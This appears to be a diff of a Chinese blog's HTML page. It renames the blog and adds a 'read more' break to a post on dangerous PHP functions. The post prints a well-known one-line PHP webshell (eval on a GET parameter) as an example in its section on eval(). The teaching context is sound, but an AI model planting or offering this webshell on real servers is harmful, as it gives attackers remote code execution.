@@ -43,7 +43,7 @@
     <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
   <div class="container">
     <a class="navbar-brand"
-       href="/">&nbsp;<strong>loser的博客</strong>&nbsp;</a>
+       href="/">&nbsp;<strong>小叹的博客</strong>&nbsp;</a>
 
     <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
             data-target="#navbarSupportedContent"
@@ -167,7 +167,9 @@
       <div class="py-5 z-depth-3" id="board">
         <div class="post-content mx-auto" id="post">
           <div class="markdown-body">
-            <h1 id="常见危险函数"><a href="#常见危险函数" class="headerlink" title="常见危险函数"></a>常见危险函数</h1><h2 id="php代码执行相关"><a href="#php代码执行相关" class="headerlink" title="php代码执行相关"></a>php代码执行相关</h2><h3 id="eval"><a href="#eval" class="headerlink" title="eval()"></a>eval()</h3><p>mixed eval ( string $code )<br>把字符串code作为php代码执行。常见的一句话木马：<br>（<code>)
+            <h1 id="常见危险函数"><a href="#常见危险函数" class="headerlink" title="常见危险函数"></a>常见危险函数</h1><h2 id="php代码执行相关"><a href="#php代码执行相关" class="headerlink" title="php代码执行相关"></a>php代码执行相关</h2><h3 id="eval"><a href="#eval" class="headerlink" title="eval()"></a>eval()</h3><p>mixed eval ( string $code )<br>把字符串code作为php代码执行。常见的一句话木马：</p>
+<a id="more"></a>
+<p>（<code>)
 &lt;?php
     eval($_GET[&#39;pass&#39;])
 ?&gt;
